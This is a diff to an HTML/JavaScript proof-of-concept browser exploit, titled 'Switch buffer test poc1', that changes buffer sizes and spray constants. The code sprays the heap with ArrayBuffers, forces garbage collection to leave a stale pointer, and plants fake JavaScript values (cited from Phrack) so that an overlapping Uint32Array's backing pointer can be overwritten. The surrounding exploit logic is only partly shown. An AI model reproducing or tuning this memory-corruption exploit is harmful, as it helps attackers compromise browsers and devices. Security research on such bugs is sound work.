@@ -9,7 +9,7 @@
         </style>
     </head>
     <body>
-        <h1>Switch buffer test poc1</h1>
+        <h1>Switch buffer test poc1 test2</h1>
         <ul>
             <li><a href='javascript:go();'>go!</a></li>
             <li><a href='javascript:document.location.reload();'>reload</a></li>
@@ -33,8 +33,8 @@
                 var killMe = 70;
                 // garbage collection stuff
                 var pressure = new Array(500);
-                var rwbuf = new ArrayBuffer(0x1003 * 4);
-                var numbufs = 20000;
+                var rwbuf = new ArrayBuffer(0x2003 * 6);
+                var numbufs = 40000;
                 var bufs = new Array(numbufs);
                 // do garbage collect
                 dgc = function() {
@@ -44,9 +44,9 @@
                         bufs[i] = null;
                 }
                 // access to the overlapping Uint32Array
-                var bufs = new Array(0x1000);
+                var bufs = new Array(0x1500);
                 // we will modify the vector of this
-                var smash = new Uint32Array(0x10);
+                var smash = new Uint32Array(0x20);
                 // the array with the stale pointer
                 var stale = 0;
                 var _dview = null;
@@ -65,7 +65,7 @@
                     // new array with 0x100 elements
                     var arr = new Array(0x100);
                     // new array buffer of length 0x1000
-                    var yolo = new ArrayBuffer(0x1000);
+                    var yolo = new ArrayBuffer(0x1024);
                     // populate the arr with pointer to yolo and a number. not quite sure why.
                     arr[0] = yolo;
                     arr[1] = 0x13371337;
@@ -92,7 +92,7 @@
                                 // which is the Integer 0x41414141
                                 // phrack: Integer FFFF:0000:IIII:IIII
                                 bufs[i][k++] = 0x41414141;
-                                bufs[i][k++] = 0xffff0000;
+                                bufs[i][k++] = 0xffffff00;
                             }
                         }
                         return 10;
